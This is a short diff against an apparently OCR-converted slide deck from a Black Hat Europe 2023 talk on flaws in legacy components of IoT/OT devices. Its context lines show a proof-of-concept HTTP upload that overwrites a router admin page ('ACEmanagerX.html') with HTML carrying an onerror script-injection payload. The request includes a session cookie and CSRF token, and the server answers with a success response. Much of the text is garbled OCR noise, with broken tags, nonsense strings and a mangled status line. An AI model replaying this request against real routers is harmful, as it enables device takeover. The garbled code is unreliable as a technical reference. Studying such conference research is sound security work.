@@ -21,7 +21,6 @@ converted_at: "2026-08-11T21:13:13Z"
 **Conference:** Black Hat Europe 2023  
 **Source:** `Black Hat Europe 2023 slides/Stanislav Dashevskyi, Francesco La Spina_Old Code Dies Hard Finding New Vulnerabilities in Old Third-Party Software Components and the Importance of Having SBoM for IoTOT Devices.pdf` (48 pages)
 
-
 ## Slide 1
 
 # Old code dies hard:
@@ -439,11 +438,9 @@ Origin: http: //192.168.56.129:1080
 Connection: keep-alive
 Referer: http://192.168.56.129:1080/admin/ACEmanagerX. html
 Cookie: token=/9beec58T4ro3d764eeb653e/39T88ic: csrf-token=15fbd63b585 /58ed96c5e344d74c5e9d
-O & 192.168.56.129:1080/admin/ACEmanagerx.htr kd + ose
 pcooss cosas eoenoseeessscoRgC0 36403764903309292865293292283
 Content-Disposition: form-data; name="upload-file"; filename="ACEmanagerX. html"
 Content-Type: text/html ———_— = oo
-= = Ll = = = = = = = = = = = = =
 <?xml version=
 Jentmi> |
 <body> =
@@ -451,7 +448,6 @@ j<ing src="https://rb.gy/qauer"/>
 <img sre="devnull" onerror="alert("ALL YOUR ROUTER BELONGS TO US')"/>
 </body> ] Ss
 </html>
-Ll = = Ll Ll = = Ll Ll = Ll Ll Ll = Ll
 SUTLaLAUnEaeatainenaeatalaunEalacaineneaEabnmeaeaEneai 36403764903309292865293292283 - -
 HTTP/1.1 2080 OK a
 Date: Mon, @2 Oct 2023 13:24:16 GMT
